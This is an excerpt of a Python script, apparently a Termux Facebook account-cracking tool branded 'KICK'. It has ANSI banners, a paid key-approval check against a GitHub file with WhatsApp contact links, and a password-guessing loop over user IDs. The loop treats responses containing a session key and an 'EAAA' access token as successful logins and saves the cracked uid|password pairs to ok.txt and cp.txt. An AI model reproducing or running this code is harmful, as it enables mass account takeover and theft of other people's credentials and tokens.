...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m KICK\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m ADMIN   : KICK  \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m GITHUB   : Kickwinnerz \x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Kickwinnerz/Approva/blob/main/Approval.txt"])
...
def notice():
	...
	os.system('am start https://wa.me/+++ +93263342276?text=' )

	runtxt("\033[0;97m Key Approval Ke KICK >> %s%s"%(G,basesplit))
	...
	subprocess.check_output(["am", "start", "https://wa.me/03047082087?text="])
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Kickwinnerz/Approval/blob/main/Approval.txt').text
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m GITHUB   : KICK \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook  :  WINNER\x1b[0m\x1b[1;97m]
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [KICK-OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [KICK-OK=>]  %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;92m   [KICK-CP=>] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write("   [KICK-CP=>]  %s|%s\n"%(uid, pw))
